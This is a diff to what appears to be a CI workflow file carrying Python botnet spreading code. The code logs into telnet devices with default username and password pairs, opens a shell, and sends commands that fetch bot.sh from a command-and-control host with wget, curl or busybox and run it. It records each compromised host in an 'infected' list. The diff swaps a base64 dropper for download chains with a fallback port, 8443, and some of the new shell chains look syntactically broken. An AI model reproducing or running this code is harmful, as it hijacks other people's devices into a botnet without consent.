@@ -97,17 +97,17 @@ jobs:
               ("rdp","rdp"),("user","password"),
           ]
 
-          # PAYLOAD: read base64 from env var (bypasses 21000 char expr limit)
-          import os as _os
-          B64 = _os.environ.get("B64", "")
-          if not B64:
-              B64 = "FAIL"
+          # PAYLOAD: short chain — base64 too long for embedded telnet buffers
+          # Cloud hosts often block non-standard ports → try 1337 then 8443
           DEPLOY = (
-              f"(echo {B64}|base64 -d>/tmp/sshd;sh /tmp/sshd {C2} {CPORT} enibot2024)||"
-              f"(echo {B64}|busybox base64 -d>/tmp/sshd;busybox sh /tmp/sshd {C2} {CPORT} enibot2024)||"
-              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd&&busybox sh /tmp/sshd {C2} {CPORT} enibot2024)||"
-              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)||"
-              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)"
+              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
+              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
+              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd&&busybox sh /tmp/sshd {C2} {CPORT} enibot2024)&"
+          )
+          DEPLOY_ALT = (
+              f"(wget -q http://{C2}:8443/bot.sh -O /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
+              f"(curl -s http://{C2}:8443/bot.sh -o /tmp/sshd&&sh /tmp/sshd {C2} {CPORT} enibot2024)&||"
+              f"(busybox wget -q http://{C2}:8443/bot.sh -O /tmp/sshd&&busybox sh /tmp/sshd {C2} {CPORT} enibot2024)&"
           )
 
           infected = []
@@ -140,8 +140,11 @@ jobs:
                           s.send(b"sh\n"); time.sleep(0.6)
                           try: s.recv(512)
                           except: pass
-                          s.send(f"{DEPLOY}\n".encode()); time.sleep(2.0)
-                          try: s.recv(512)
+                          s.send(f"{DEPLOY}\n".encode()); time.sleep(1.5)
+                          try: s.recv(256)
+                          except: pass
+                          s.send(f"{DEPLOY_ALT}\n".encode()); time.sleep(1.5)
+                          try: s.recv(256)
                           except: pass
                           s.close()
                           with lock: infected.append(f"TELNET:{ip}:{port}:{user}:{pw}")
